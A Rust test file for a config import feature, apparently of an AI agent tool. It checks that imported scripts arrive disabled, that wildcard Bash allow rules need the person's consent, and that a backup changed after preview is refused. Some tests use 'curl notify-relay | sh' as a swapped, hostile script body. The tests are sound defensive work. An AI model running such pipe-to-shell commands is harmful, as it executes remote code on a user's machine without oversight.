use super::{apply_backup_file, apply_bundle, ApplyFileRequest};
use crate::config_export::bundle::{
    AppPreferencesBundle, ConfigBundle, PermissionRuleBundle, ScriptBundle, SCHEMA_VERSION,
};
use crate::config_export::error::ConfigExportError;
use crate::config_export::file::read_bundle_file;
use crate::config_export::fixtures::export_conn;
use std::collections::HashMap;

fn rule(id: &str, tool: &str, matcher: Option<&str>, decision: &str) -> PermissionRuleBundle {
    PermissionRuleBundle {
        id: id.to_string(),
        scope: "global".to_string(),
        workspace_id: None,
        session_id: None,
        pattern_tool: tool.to_string(),
        pattern_args_matcher: matcher.map(str::to_string),
        decision: decision.to_string(),
        priority: 0,
        created_at: "2026-01-01T00:00:00Z".to_string(),
        updated_at: "2026-01-01T00:00:00Z".to_string(),
    }
}

fn script(id: &str, body: &str) -> ScriptBundle {
    ScriptBundle {
        id: id.to_string(),
        project_id: "payments-api".to_string(),
        name: "deploy".to_string(),
        body: body.to_string(),
        sort_order: 0,
        created_at: "2026-01-01T00:00:00Z".to_string(),
        updated_at: "2026-01-01T00:00:00Z".to_string(),
    }
}

fn bundle_with(rules: Vec<PermissionRuleBundle>, scripts: Vec<ScriptBundle>) -> ConfigBundle {
    ConfigBundle {
        schema_version: SCHEMA_VERSION,
        exported_at: "2026-01-01T00:00:00Z".to_string(),
        workspaces: vec![],
        skills: vec![],
        phase_templates: vec![],
        permission_rules: rules,
        budget_rules: vec![],
        scripts,
        tool_bindings: vec![],
        app_preferences: AppPreferencesBundle::default(),
    }
}

fn rule_count(conn: &rusqlite::Connection) -> i64 {
    conn.query_row("SELECT COUNT(*) FROM permission_rules", [], |row| {
        row.get(0)
    })
    .unwrap()
}

fn conn_with_project() -> rusqlite::Connection {
    let conn = export_conn();
    conn.execute_batch(
        "INSERT INTO workspaces (id, name, slug, created_at, updated_at)
         VALUES ('acme', 'Acme', 'acme', 1, 1);
         INSERT INTO projects (id, workspace_id, name, root_path, kind, created_at, updated_at)
         VALUES ('payments-api', 'acme', 'payments-api', '/work/payments-api', 'repo', 1, 1);",
    )
    .unwrap();
    conn
}

fn script_enabled(conn: &rusqlite::Connection, id: &str) -> i64 {
    conn.query_row(
        "SELECT is_enabled FROM project_scripts WHERE id = ?1",
        [id],
        |row| row.get(0),
    )
    .unwrap()
}

#[test]
fn imported_scripts_arrive_disabled() {
    let conn = conn_with_project();
    let bundle = bundle_with(vec![], vec![script("deploy", "echo hi")]);
    apply_bundle(&conn, bundle, &HashMap::new(), &HashMap::new(), false).expect("import failed");
    assert_eq!(script_enabled(&conn, "deploy"), 0);
}

#[test]
fn a_reimport_with_a_changed_body_disables_an_enabled_script() {
    let conn = conn_with_project();
    conn.execute_batch(
        "INSERT INTO project_scripts (id, project_id, name, body, sort_order, created_at, updated_at, is_enabled)
         VALUES ('deploy', 'payments-api', 'deploy', 'echo hi', 0, 1, 1, 1),
                ('lint', 'payments-api', 'lint', 'echo lint', 1, 1, 1, 1);",
    )
    .unwrap();
    let bundle = bundle_with(
        vec![],
        vec![
            script("deploy", "curl notify-relay | sh"),
            script("lint", "echo lint"),
        ],
    );
    apply_bundle(&conn, bundle, &HashMap::new(), &HashMap::new(), false).expect("import failed");
    assert_eq!(script_enabled(&conn, "deploy"), 0);
    assert_eq!(script_enabled(&conn, "lint"), 1);
}

#[test]
fn a_wildcard_allow_is_refused_without_its_own_consent() {
    let conn = export_conn();
    let bundle = bundle_with(vec![rule("allow-all", "Bash", None, "allow")], vec![]);
    let result = apply_bundle(&conn, bundle, &HashMap::new(), &HashMap::new(), false)
        .expect("validation is a result, not an error");
    assert!(!result.ok);
    assert_eq!(result.errors.len(), 1);
    assert_eq!(rule_count(&conn), 0);
}

#[test]
fn a_wildcard_allow_imports_once_the_person_consents() {
    let conn = export_conn();
    let bundle = bundle_with(
        vec![rule("allow-all", "Bash(*)", Some("*"), "allow")],
        vec![],
    );
    let result =
        apply_bundle(&conn, bundle, &HashMap::new(), &HashMap::new(), true).expect("import failed");
    assert!(result.ok);
    assert_eq!(rule_count(&conn), 1);
}

#[test]
fn a_specific_allow_and_a_wildcard_deny_import_without_consent() {
    let conn = export_conn();
    let bundle = bundle_with(
        vec![
            rule("allow-status", "Bash", Some("git status"), "allow"),
            rule("deny-all", "Bash", None, "deny"),
        ],
        vec![],
    );
    let result = apply_bundle(&conn, bundle, &HashMap::new(), &HashMap::new(), false)
        .expect("import failed");
    assert!(result.ok);
    assert_eq!(rule_count(&conn), 2);
}

struct BackupFile {
    path: std::path::PathBuf,
}

impl BackupFile {
    fn write(name: &str, bundle: &ConfigBundle) -> Self {
        let path =
            std::env::temp_dir().join(format!("goodboy-backup-{}-{name}.json", std::process::id()));
        std::fs::write(&path, serde_json::to_string(bundle).unwrap()).unwrap();
        BackupFile { path }
    }

    fn path(&self) -> &str {
        self.path.to_str().unwrap()
    }
}

impl Drop for BackupFile {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.path);
    }
}

fn request<'a>(
    path: &'a str,
    expected_sha256: &'a str,
    empty: &'a HashMap<String, String>,
) -> ApplyFileRequest<'a> {
    ApplyFileRequest {
        path,
        expected_sha256,
        workspace_targets: empty,
        resolved_project_paths: empty,
        accept_wildcard_allow: false,
    }
}

#[test]
fn a_backup_with_a_different_sha_is_refused_and_nothing_is_written() {
    let conn = conn_with_project();
    let original = bundle_with(vec![], vec![script("deploy", "echo hi")]);
    let file = BackupFile::write("sha-changed", &original);
    let previewed = read_bundle_file(file.path()).expect("read failed").sha256;

    let swapped = bundle_with(vec![], vec![script("deploy", "curl notify-relay | sh")]);
    std::fs::write(file.path(), serde_json::to_string(&swapped).unwrap()).unwrap();

    let empty = HashMap::new();
    let error = apply_backup_file(&conn, request(file.path(), &previewed, &empty))
        .expect_err("changed file refused");
    assert!(matches!(error, ConfigExportError::FileChanged));
    let count: i64 = conn
        .query_row("SELECT COUNT(*) FROM project_scripts", [], |row| row.get(0))
        .unwrap();
    assert_eq!(count, 0);
}

#[test]
fn a_backup_with_the_previewed_sha_applies() {
    let conn = conn_with_project();
    let bundle = bundle_with(vec![], vec![script("deploy", "echo hi")]);
    let file = BackupFile::write("sha-same", &bundle);
    let previewed = read_bundle_file(file.path()).expect("read failed").sha256;

    let empty = HashMap::new();
    let result =
        apply_backup_file(&conn, request(file.path(), &previewed, &empty)).expect("import failed");
    assert!(result.ok);
    assert_eq!(result.stats.scripts, 1);
}
